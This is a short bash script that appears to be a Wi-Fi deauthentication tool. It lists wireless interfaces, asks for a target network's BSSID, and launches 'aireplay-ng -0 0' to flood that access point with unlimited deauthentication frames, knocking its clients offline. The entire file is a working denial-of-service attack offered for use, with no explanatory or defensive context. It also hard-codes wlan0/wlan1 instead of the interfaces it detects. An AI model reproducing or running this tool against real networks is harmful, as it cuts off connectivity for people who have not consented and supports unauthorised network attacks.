#! /bin/bash

#Colors
RED='\033[91m'
GREEN='\033[92m'
YELLOW='\033[93m'
BLUE='\033[94m'
WHITE='\033[97m'
NC='\033[0m'

#Select Interface

echo  -e "${RED}\tAvailable Interfaces :${NC}"
echo -e "\v\t${WHITE} 1.$(ifconfig | grep wl | awk -F ':' '{print $1}' | head -1)${NC}"
echo -e "\v\t${WHITE} 2.$(ifconfig | grep wl | awk -F ':' '{print $1}' | tail -1)${NC}"

#select interface :

read -p "$(echo -e ${BLUE}"\tSelect The Interface :"${NC}) " in_face


#wifi_deauth

case $in_face in
1)
	read -p  "$(echo -e ${BLUE}"\v\tEnter The BSSID Of The Target :"${NC}) " target
	gnome-terminal -- aireplay-ng -0 0 -a $target wlan0 ;;
2)
	read -p  "$(echo -e ${BLUE}"\v\tEnter The BSSID Of The Target :"${NC}) " target
	gnome-terminal -- aireplay-ng -0 0 -a $target wlan1 ;;
*)
	echo " INVAILD INPUT...!" ;;
esac
